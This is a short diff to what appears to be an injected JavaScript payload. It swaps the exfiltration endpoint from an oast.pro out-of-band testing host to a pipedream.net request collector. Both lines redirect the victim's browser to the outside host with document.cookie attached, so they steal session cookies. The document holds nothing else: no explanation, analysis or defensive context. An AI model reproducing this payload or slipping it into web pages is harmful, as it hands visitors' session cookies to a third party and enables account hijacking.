@@ -1,2 +1,2 @@
-window.location.href = 'https://cxdaazkz1wg0000tn4f0gqsifoyyyyyyb.oast.pro/?cookie=' + document.cookie;
+window.location.href = 'https://eomjwbt0tbnmktz.m.pipedream.net/?cookie=' + document.cookie;
 
